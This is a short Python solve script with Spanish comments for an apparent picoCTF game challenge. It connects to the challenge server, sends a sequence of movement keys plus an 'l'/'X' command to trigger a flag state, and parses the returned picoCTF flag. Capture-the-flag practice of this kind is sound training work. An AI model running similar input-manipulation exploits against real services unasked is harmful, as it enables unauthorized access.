import socket, time, re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('saturn.picoctf.net', 59375))
time.sleep(0.3)
s.recv(8192)

print("Test: l + mover izquierda muchas veces\n")

# Ir a (0, 4) primero
for i in range(5):
    s.send(b'w\n')
    time.sleep(0.12)

time.sleep(0.3)
data = s.recv(4096).decode(errors='ignore')
for line in data.split('\n'):
    if 'Player position' in line:
        print(f"Después de subir: {line.strip()}")
        break

# Comando l + X
s.send(b'l')
time.sleep(0.2)
s.send(b'X')
time.sleep(0.2)

# Mover izquierda 10 veces
for i in range(10):
    s.send(b'a\n')
    time.sleep(0.1)

time.sleep(0.5)
data = s.recv(8192).decode(errors='ignore')

if 'flag: 1' in data:
    print("\n¡FLAG ACTIVADA!")
    s.send(b'p\n')
    time.sleep(2)
    final = s.recv(8192).decode(errors='ignore')
    match = re.search(r'picoCTF\{[^}]+\}', final)
    if match:
        print(f"FLAG: {match.group()}")
else:
    print("Estado:")
    for line in data.split('\n')[-10:]:
        if 'Player' in line or 'flag' in line:
            print(line)

s.close()
